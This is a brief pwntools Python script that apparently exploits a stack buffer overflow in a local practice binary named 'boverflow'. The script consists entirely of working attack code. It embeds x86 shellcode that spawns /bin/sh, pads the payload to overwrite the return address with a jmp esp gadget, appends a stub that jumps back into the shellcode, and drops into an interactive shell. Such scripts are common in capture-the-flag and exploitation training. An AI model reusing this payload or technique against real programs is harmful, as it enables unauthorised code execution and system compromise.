from pwn import *
p = process("./boverflow")
sc = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
jmp_esp = 0x08048504
gdb.attach(p)
payload = sc.ljust(0x20+4,"a") + p32(jmp_esp) + asm("sub esp, 0x28;jmp esp")
p.sendlineafter("What's your name?\n",payload)
p.interactive()
